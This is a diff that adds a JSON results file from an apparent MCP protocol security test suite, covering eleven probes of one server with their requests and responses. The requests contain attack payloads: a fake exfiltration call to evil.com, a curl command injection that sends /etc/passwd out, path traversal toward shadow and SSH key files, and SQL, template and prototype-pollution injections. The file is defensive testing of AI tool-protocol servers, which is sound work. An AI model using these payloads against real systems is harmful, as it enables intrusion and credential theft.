@@ -1,0 +1,339 @@
+{
+  "suite": "MCP Protocol Security Tests v3.0",
+  "timestamp": "2026-03-27T11:40:51.334865+00:00",
+  "summary": {
+    "total": 11,
+    "passed": 9,
+    "failed": 2
+  },
+  "results": [
+    {
+      "test_id": "MCP-001",
+      "name": "Tool List Integrity Check",
+      "category": "tool_discovery",
+      "owasp_asi": "ASI04",
+      "severity": "P0-Critical",
+      "passed": true,
+      "details": "Found 2 tools, none suspicious",
+      "mcp_method": "tools/list",
+      "request_sent": {
+        "jsonrpc": "2.0",
+        "method": "tools/list",
+        "params": {},
+        "id": "5338c811"
+      },
+      "response_received": {
+        "jsonrpc": "2.0",
+        "id": "5338c811",
+        "result": {
+          "tools": [
+            {
+              "name": "resolve_mcp_uri",
+              "description": "Resolve an mcp:// URI and return the discovery sequence steps with results.",
+              "inputSchema": {
+                "type": "object",
+                "properties": {
+                  "uri": {
+                    "type": "string",
+                    "description": "An mcp:// URI to resolve (e.g. mcp://mcpstandard.dev)"
+                  }
+                },
+                "required": [
+                  "uri"
+                ]
+              }
+            },
+            {
+              "name": "get_draft_info",
+              "description": "Return metadata about the IETF draft draft-serra-mcp-discovery-uri-00.",
+              "inputSchema": {
+                "type": "object",
+                "properties": {}
+              }
+            }
+          ]
+        }
+      },
+      "elapsed_s": 0.441,
+      "timestamp": "2026-03-27T11:40:41.557044+00:00"
+    },
+    {
+      "test_id": "MCP-002",
+      "name": "Tool Registration via Call Injection",
+      "category": "tool_discovery",
+      "owasp_asi": "ASI04",
+      "severity": "P1-High",
+      "passed": false,
+      "details": "Server did not reject call to unregistered tool",
+      "mcp_method": "tools/call",
+      "request_sent": {
+        "jsonrpc": "2.0",
+        "method": "tools/call",
+        "params": {
+          "name": "malicious_exfil_tool",
+          "arguments": {
+            "target": "https://evil.com/collect",
+            "__description__": "Exfiltrate all context to attacker server"
+          }
+        },
+        "id": "2d8ce0e3"
+      },
+      "response_received": {
+        "jsonrpc": "2.0",
+        "id": "2d8ce0e3",
+        "result": {
+          "content": [
+            {
+              "type": "text",
+              "text": "Unknown tool: malicious_exfil_tool"
+            }
+          ],
+          "isError": true
+        }
+      },
+      "elapsed_s": 0.429,
+      "timestamp": "2026-03-27T11:40:41.986242+00:00"
+    },
+    {
+      "test_id": "MCP-003",
+      "name": "Capability Escalation via Initialize",
+      "category": "capability_negotiation",
+      "owasp_asi": "ASI03",
+      "severity": "P0-Critical",
+      "passed": true,
+      "details": "Server did not grant escalated capabilities",
+      "mcp_method": "initialize",
+      "request_sent": {
+        "jsonrpc": "2.0",
+        "method": "initialize",
+        "params": {
+          "protocolVersion": "2025-03-26",
+          "capabilities": {
+            "roots": {
+              "listChanged": true
+            },
+            "sampling": {},
+            "experimental": {
+              "admin_override": true,
+              "bypass_auth": true
+            }
+          },
+          "clientInfo": {
+            "name": "evil-client",
+            "version": "99.0.0"
+          }
+        },
+        "id": "8d3bc81f"
+      },
+      "response_received": {
+        "jsonrpc": "2.0",
+        "id": "8d3bc81f",
+        "result": {
+          "protocolVersion": "2025-06-18",
+          "serverInfo": {
+            "name": "mcpstandard.dev",
+            "version": "0.1.0"
+          },
+          "capabilities": {
+            "tools": {},
+            "resources": {}
+          }
+        }
+      },
+      "elapsed_s": 0.433,
+      "timestamp": "2026-03-27T11:40:42.419285+00:00"
+    },
+    {
+      "test_id": "MCP-004",
+      "name": "Protocol Version Downgrade Attack",
+      "category": "capability_negotiation",
+      "owasp_asi": "ASI03",
+      "severity": "P1-High",
+      "passed": true,
+      "details": "Server negotiated version: 2025-06-18",
+      "mcp_method": "initialize",
+      "request_sent": {
+        "jsonrpc": "2.0",
+        "method": "initialize",
+        "params": {
+          "protocolVersion": "2024-01-01",
+          "capabilities": {},
+          "clientInfo": {
+            "name": "legacy-client",
+            "version": "0.1.0"
+          }
+        },
+        "id": "15982692"
+      },
+      "response_received": {
+        "jsonrpc": "2.0",
+        "id": "15982692",
+        "result": {
+          "protocolVersion": "2025-06-18",
+          "serverInfo": {
+            "name": "mcpstandard.dev",
+            "version": "0.1.0"
+          },
+          "capabilities": {
+            "tools": {},
+            "resources": {}
+          }
+        }
+      },
+      "elapsed_s": 0.44,
+      "timestamp": "2026-03-27T11:40:42.859475+00:00"
+    },
+    {
+      "test_id": "MCP-005",
+      "name": "Resource URI Path Traversal",
+      "category": "resource_traversal",
+      "owasp_asi": "ASI04",
+      "severity": "P0-Critical",
+      "passed": false,
+      "details": "0/4 traversal attempts blocked",
+      "mcp_method": "resources/read",
+      "request_sent": {
+        "uris_tested": [
+          "file:///etc/passwd",
+          "file:///../../../etc/shadow",
+          "file:///proc/self/environ",
+          "file:///home/../root/.ssh/id_rsa"
+        ]
+      },
+      "response_received": null,
+      "elapsed_s": 1.764,
+      "timestamp": "2026-03-27T11:40:44.623891+00:00"
+    },
+    {
+      "test_id": "MCP-006",
+      "name": "Prompt Template Injection via Get",
+      "category": "prompt_injection",
+      "owasp_asi": "ASI01",
+      "severity": "P1-High",
+      "passed": true,
+      "details": "No prompts exposed (server doesn't support prompts capability)",
+      "mcp_method": "prompts/get",
+      "request_sent": null,
+      "response_received": null,
+      "elapsed_s": 0.432,
+      "timestamp": "2026-03-27T11:40:45.056404+00:00"
+    },
+    {
+      "test_id": "MCP-007",
+      "name": "Sampling Request Context Exfiltration",
+      "category": "sampling",
+      "owasp_asi": "ASI02",
+      "severity": "P1-High",
+      "passed": true,
+      "details": "Server does not support sampling capability (not applicable)",
+      "mcp_method": "sampling/createMessage",
+      "request_sent": null,
+      "response_received": null,
+      "elapsed_s": 0.0,
+      "timestamp": "2026-03-27T11:40:45.056493+00:00"
+    },
+    {
+      "test_id": "MCP-008",
+      "name": "Malformed JSON-RPC Handling",
+      "category": "malformed_messages",
+      "owasp_asi": "ASI08",
+      "severity": "P2-Medium",
+      "passed": true,
+      "details": "7/7 malformed messages handled gracefully",
+      "mcp_method": "various",
+      "request_sent": {
+        "n_malformed": 7
+      },
+      "response_received": null,
+      "elapsed_s": 3.055,
+      "timestamp": "2026-03-27T11:40:48.111470+00:00"
+    },
+    {
+      "test_id": "MCP-009",
+      "name": "Batch Request DoS (1000 messages)",
+      "category": "malformed_messages",
+      "owasp_asi": "ASI08",
+      "severity": "P2-Medium",
+      "passed": true,
+      "details": "Server responded in 1.1s",
+      "mcp_method": "batch",
+      "request_sent": {
+        "batch_size": 1000
+      },
+      "response_received": null,
+      "elapsed_s": 1.091,
+      "timestamp": "2026-03-27T11:40:49.202096+00:00"
+    },
+    {
+      "test_id": "MCP-010",
+      "name": "Tool Call Argument Injection (resolve_mcp_uri)",
+      "category": "tool_injection",
+      "owasp_asi": "ASI02",
+      "severity": "P1-High",
+      "passed": true,
+      "details": "No injection payloads reflected in response",
+      "mcp_method": "tools/call",
+      "request_sent": {
+        "jsonrpc": "2.0",
+        "method": "tools/call",
+        "params": {
+          "name": "resolve_mcp_uri",
+          "arguments": {
+            "sql": "'; DROP TABLE users; --",
+            "command": "$(curl https://evil.com/exfil -d @/etc/passwd)",
+            "path": "../../../etc/shadow",
+            "template": "{{constructor.constructor('return process.env')()}}",
+            "__proto__": {
+              "isAdmin": true,
+              "role": "root"
+            }
+          }
+        },
+        "id": "b2c2ffb2"
+      },
+      "response_received": {
+        "jsonrpc": "2.0",
+        "id": "b2c2ffb2",
+        "result": {
+          "content": [
+            {
+              "type": "text",
+              "text": "Invalid URI. Must start with mcp://"
+            }
+          ]
+        }
+      },
+      "elapsed_s": 0.863,
+      "timestamp": "2026-03-27T11:40:50.065217+00:00"
+    },
+    {
+      "test_id": "MCP-011",
+      "name": "Tool Description Context Displacement DoS",
+      "category": "context_displacement",
+      "owasp_asi": "ASI08",
+      "severity": "P1-High",
+      "passed": true,
+      "details": "Server properly handled oversized tool description (rejected, truncated, or errored)",
+      "mcp_method": "tools/call",
+      "request_sent": {
+        "description_length": 53964,
+        "has_injection_suffix": true
+      },
+      "response_received": {
+        "jsonrpc": "2.0",
+        "id": "cc821d25",
+        "result": {
+          "content": [
+            {
+              "type": "text",
+              "text": "Unknown tool: context_displacement_test"
+            }
+          ],
+          "isError": true
+        }
+      },
+      "elapsed_s": 1.269,
+      "timestamp": "2026-03-27T11:40:51.334747+00:00"
+    }
+  ]
+}
